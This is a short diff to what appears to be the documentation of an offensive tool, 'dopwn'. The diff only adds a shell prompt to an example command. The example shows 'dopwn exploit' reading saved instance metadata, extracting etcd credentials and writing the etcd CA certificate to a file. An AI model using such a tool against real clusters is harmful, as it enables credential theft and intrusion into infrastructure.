@@ -36,7 +36,7 @@ Save this output to a file on your local machine, either by copy/paste or output
 In this example, I'll put it in a file called `user-data.txt`. Now run `dopwn exploit` with the `-f` parameter specifying the location of the `user-data.txt` file.
 
 ```bash
-dopwn exploit -f user-data.txt
+$ dopwn exploit -f user-data.txt
 2018-12-20T10:29:56Z [ℹ]  read metadata from file: user-data.txt
 2018-12-20T10:29:56Z [ℹ]  parsing metadata to get etcd creds
 2018-12-20T10:29:56Z [ℹ]  writing etcd ca to file: etcd-ca.crt
